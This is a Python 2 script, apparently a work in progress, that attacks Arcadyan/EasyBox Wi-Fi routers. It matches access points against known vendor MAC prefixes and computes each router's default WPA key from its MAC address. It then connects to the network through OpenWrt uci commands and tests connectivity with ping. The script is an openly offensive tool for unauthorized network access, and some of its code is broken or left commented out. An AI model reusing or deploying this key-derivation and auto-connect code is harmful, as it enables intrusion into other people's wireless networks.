#!/usr/bin/env python

#############
# LIBRARIES #
#############

import subprocess
import os
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import sqlite3 as lite
import time


from subprocess import call
from sys import argv          # Command-line arguments
from sys import stdout, stdin # Flushing
#from scapy.all import *

###########################
#     VARS AND INIT       #
###########################

debug = 1
version = 0.1


DN = open(os.devnull, 'w')
ap_list = []
ap_vuln = []
 

arcadyan_mac = ["00:12:BF","00:1A:2A", "00:1D:19","00:23:08", "00:26:4D","1C:C6:3C","50:7E:5D", "74:31:70","7C:4F:B5","88:25:2C"]

###########################
#     DB CONNECTION       #
###########################
try:
    con = lite.connect('accesspoints.db')
    
    cur = con.cursor()    
               
    
except lite.Error, e:
    
    print "Error %s:" % e.args[0]
    sys.exit(1)


###########################
#        FUNCTIONS        #
###########################

class AP:
	def __init__(self, ssid, mac):
		self.ssid = ssid
                self.mac = mac
        def getKey(self):
            return easybox(self.mac)
            
def enable_monitor_mode(iface):
        print 'Enabling monitor mode...'
        call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)


def disable_monitor_mode():
        call(['airmon-ng', 'stop', 'mon0'], stdout=DN, stderr=DN)


def PacketHandler(pkt) :
	if pkt.haslayer(Dot11) :
		if pkt.type == 0 and pkt.subtype == 8 :
			if pkt.addr2 not in ap_list :
                                
				ap_list.append(AP(pkt.info,pkt.addr2))
				if debug: print "AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)


def ping(host = "8.8.8.8"):
    result = subprocess.call(["ping",host],stdout=DN,stderr=DN)
    if result == 0:
        return 1
    else:
	return 0

def connectAP(ssid,key):
	call(['uci set wireless.@wifi-iface[0].encryption=psk2'], stdout=DN, stderr=DN)
	call(['uci set wireless.@wifi-iface[0].ssid='+ssid], stdout=DN, stderr=DN)
	call(['uci set wireless.@wifi-iface[0].key='+key], stdout=DN, stderr=DN)
	call(['uci commit wireless'])
	call(['wifi'])

def easybox(mac):
        bytes = [int(x, 16) for x in mac.split(':')]

        c1 = (bytes[-2] << 8) + bytes[-1]
        (s6, s7, s8, s9, s10) = [int(x) for x in '%05d' % (c1)]
        (m7, m8, m9, m10, m11, m12) = [int(x, 16) for x in mac.replace(':', '')[6:]]

        k1 = (s7 + s8 + m11 + m12) & (0x0F)
        k2 = (m9 + m10 + s9 + s10) & (0x0F)

        x1 = k1 ^ s10
        x2 = k1 ^ s9
        x3 = k1 ^ s8
        y1 = k2 ^ m10
        y2 = k2 ^ m11
        y3 = k2 ^ m12
        z1 = m11 ^ s10
        z2 = m12 ^ s9
        z3 = k1 ^ k2
        return "%X%X%X%X%X%X%X%X%X" % (x1, y1, z1, x2, y2, z2, x3, y3, z3)

def printDB_AP():
    with con:
        con.row_factory = lite.Row

        cur = con.cursor() 
        cur.execute("SELECT * FROM accesspoints")
        rows = cur.fetchall()

        for row in rows:
            print "%s MAC=%s KEY=%s" % (row["SSID"], row["MAC"], row["KEY"])

def getSQLVersion():
    cur.execute('SELECT SQLITE_VERSION()')
    data = cur.fetchone()
    return data 

###########################
#      MAIN PROGRAM       #
###########################


ap_list.append(AP("00:12:BF","00:1A:2A:00:1A:2A"))

print "Script version: %s" % version
print "SQLite version: %s" % getSQLVersion()


#enable_monitor_mode('eth1')
#sniff(iface="mon0", prn = PacketHandler)

print 'Scanning 10 seconds...'
time.sleep(1)
print('APs found: %d' %len(ap_list))
for ap in ap_list:
        mac = ap.mac
        mac = mac[0:8]
        if mac in arcadyan_mac:
            print('Connecting to: %s with key: %s' % (ap.ssid,ap.getKey()))
            #connectAP(ap.ssid,ap.getKey())
            time.sleep(6)
            if ping() == 1:
                print 'Ping successful'
            else:
                print 'No Ping'
            

#printDB_AP()




#print ping("www.google.dssdefe")



